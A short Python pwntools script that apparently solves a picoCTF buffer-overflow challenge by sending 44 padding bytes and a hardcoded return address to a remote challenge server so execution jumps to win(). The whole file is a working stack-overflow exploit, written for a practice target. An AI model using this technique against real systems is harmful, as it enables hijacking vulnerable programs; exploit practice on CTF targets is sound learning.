from pwn import *

# load the on‑disk binary
elf = ELF("./buffer-overflow1")

# start process (or remote)
# p = process("./vuln")
p = remote("saturn.picoctf.net", "61535")

# grab the leak of main’s runtime address
p.recvline()
# compute the real address of win()
win_addr = elf.symbols['win']
print(f"win() address: {hex(win_addr)}")

payload = b"A" * 44 + b"\xf6\x91\x04\x08" 

# send the payload
p.sendline(payload)
# receive the output
print(p.recvline())
print(p.recvline())

p.close()
